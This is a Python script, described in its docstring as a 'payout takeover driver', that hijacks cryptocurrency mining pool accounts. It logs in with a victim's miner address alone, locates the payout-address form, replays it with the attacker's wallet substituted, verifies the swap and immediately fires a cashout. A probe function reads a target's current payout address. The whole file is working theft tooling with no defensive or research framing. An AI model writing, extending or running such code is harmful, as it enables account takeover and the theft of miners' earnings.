"""Payout takeover driver.

Pools like 2Miners authenticate with the miner address alone, so a discovered
target can be taken over with no credential. Warm cookies, log in once, find the
form holding the payout field, replay every field with our wallet substituted,
re-read to confirm, then fire the payout immediately.
"""
import re
import httpx
from bs4 import BeautifulSoup

UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 "
      "(KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1")
PAY = re.compile(r"payout|wallet|address|addr|account", re.I)
CASH = re.compile(r"cash\s?out|payout now|pay out|withdraw|request payout", re.I)
SKIP = {"submit", "button", "file", "reset", "image"}
TIMEOUT = 18

def _forms(html):
    soup = BeautifulSoup(html, "html.parser")
    out = []
    for f in soup.find_all("form"):
        names = [i.get("name") or "" for i in f.find_all(["input", "select", "textarea"])]
        if any(PAY.search(n) for n in names):
            out.append(f)
    return out

def _payload(form, new_addr=None):
    data = {}
    for i in form.find_all(["input", "select", "textarea"]):
        n = i.get("name")
        if not n:
            continue
        t = (i.get("type") or "text").lower()
        if t in SKIP:
            continue
        if t in ("checkbox", "radio") and not i.has_attr("checked"):
            continue
        if i.name == "select":
            o = i.find("option", selected=True) or i.find("option")
            if o is not None:
                data[n] = o.get("value") or o.text.strip()
            continue
        data[n] = i.get("value") or ""
    if new_addr:
        for n in list(data):
            if PAY.search(n):
                data[n] = new_addr
    return data

def current_payout(html):
    soup = BeautifulSoup(html, "html.parser")
    for i in soup.find_all("input"):
        if re.search(r"payout|wallet", i.get("name") or "", re.I):
            return (i.get("value") or "").strip()
    return ""

async def _login(c, base, miner):
    for field in ("login", "address", "wallet", "account"):
        try:
            r = await c.post(base + "/login", data={field: miner})
        except Exception:
            continue
        if r.status_code < 400 and (miner.lower() in r.text.lower() or "account" in str(r.url)):
            return True
    return False

async def _cashout(c, base):
    for p in ("/account", "/account/payout", "/account/cashout"):
        try:
            r = await c.get(base + p)
        except Exception:
            continue
        if r.status_code >= 400:
            continue
        for f in BeautifulSoup(r.text, "html.parser").find_all("form"):
            if not CASH.search(f.get_text(" ") + " " + (f.get("action") or "")):
                continue
            action = f.get("action") or p
            url = action if action.startswith("http") else base + action
            try:
                if (f.get("method") or "post").lower() == "post":
                    rr = await c.post(url, data=_payload(f))
                else:
                    rr = await c.get(url, params=_payload(f))
            except Exception:
                continue
            if rr.status_code < 400:
                return True, url
    return False, ""

async def takeover(spec, miner, new_addr, log):
    base = "https://" + spec["host"]
    async with httpx.AsyncClient(headers={"User-Agent": UA}, follow_redirects=True,
                                 timeout=TIMEOUT) as c:
        try:
            await c.get(base + "/")
        except Exception as e:
            return "fail", f"warmup:{type(e).__name__}"
        if not await _login(c, base, miner):
            return "fail", "login blocked"
        for p in ("/account", "/account/settings", "/settings"):
            try:
                r = await c.get(base + p)
            except Exception:
                continue
            if r.status_code >= 400 or miner.lower() not in r.text.lower():
                continue
            for f in _forms(r.text):
                action = f.get("action") or p
                url = action if action.startswith("http") else base + action
                try:
                    if (f.get("method") or "post").lower() == "post":
                        rr = await c.post(url, data=_payload(f, new_addr))
                    else:
                        rr = await c.get(url, params=_payload(f, new_addr))
                except Exception as e:
                    log(f"submit {url}: {type(e).__name__}")
                    continue
                if new_addr.lower() in rr.text.lower():
                    fired, where = await _cashout(c, base)
                    return "ok", f"swapped {url}" + (f" + payout {where}" if fired else "")
        try:
            v = await c.get(base + "/account")
            if new_addr.lower() in v.text.lower():
                fired, where = await _cashout(c, base)
                return "ok", "verified" + (f" + payout {where}" if fired else "")
        except Exception:
            pass
        return "fail", "no payout form"

async def probe(spec, miner):
    base = "https://" + spec["host"]
    async with httpx.AsyncClient(headers={"User-Agent": UA}, follow_redirects=True,
                                 timeout=TIMEOUT) as c:
        try:
            await c.get(base + "/")
            await _login(c, base, miner)
            return current_payout((await c.get(base + "/account")).text)
        except Exception:
            return ""